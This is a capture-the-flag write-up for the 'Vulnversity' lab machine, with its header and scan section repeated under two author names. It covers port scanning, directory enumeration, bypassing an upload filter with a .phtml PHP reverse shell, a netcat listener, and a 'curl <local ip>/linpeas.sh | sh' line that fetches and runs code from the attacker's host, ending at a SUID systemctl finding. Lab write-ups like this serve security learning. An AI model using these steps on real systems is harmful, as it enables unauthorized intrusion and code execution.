Vulnversity
=================

> Armand Alvarez | 17 July 2021

------------------------



Task 1: Reconnaissance

# Nmap scan

**21** - ftp - vsftpd 3.0.3
**22** - ssh - OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
**139** - netbios-ssn Samba smbd 3.x - 4.x
**445** - ' ' smbd 4.3.11-Ubuntu
**3128** - http-proxy - Squid http proxy 3.5.12
**3333** - http - Apache httpd 2.4.18

* Scan the box, how many ports are open?
`6`

* What version of the squid proxy is running on the machine?
`3.5.12`





# Vulnversity
 _Author: minimcloving_

 _Date: 17 July 2021_

--------------------
--------------------
## nmap scan

###Open Port
* **21** - ftp - vsftpd 3.0.3
* **22** - ssh - OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
* **139** - netbios-ssn Samba smbd 3.x - 4.x
* **445** - ' ' smbd 4.3.11-Ubuntu
* **3128** - http-proxy - Squid http proxy 3.5.12
* **3333** - http - Apache httpd 2.4.18

###OS Detection
* OS: Windows 6.1 (Samba 4.3.11-Ubuntu)


## GoBuster

```
http://<ip>:3333
wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
* /images
* /css
* /js
* /fonts
* /internal
* /server-status


## Notes

* /internal brings us to a form upload pages
    * .php is not allowed
    * No extention in original /usr/share/wordlists/wfuzz/general/extensions_common.txt are allowed
    * Fuzzing the upload form, we find that **.phtml** is allowed


## Walkthrough

* nmap scan
    * discovered webserver
* dirbuster to find dirs
    * discovered form upload
* fuzzed w/ burpsuite
    * discovered .phtml file extension allowed
    * uploaded php reverse shell with `.phtml` extension 
* get in with nc
    * Navigating around reverse shell, discover user named `bill`
    * his home directory contained the flag
* Transfer linpeas.sh to our exploited machine to run the script
    * On local machine, run this command:
        * `python -m SimpleHTTPServer 80`
    * On the victim machine, run this command:
        * `curl <local ip address*>/linpeas.sh | sh`
            * * If you are using openvpn, this will be the ip address that openvpn generates, not your actual machines local ip address. This is because the victim machine can only connect to the vpn address. Try it yourself: once you get into the machine, send a ping to both addresses (you may have to ctrl+c to escape the ping and redo your nc -lvnp connection)
* linpeas.sh shows under interesting files -> SUID:
    * /bin/systemctl


# CTF-Writeups
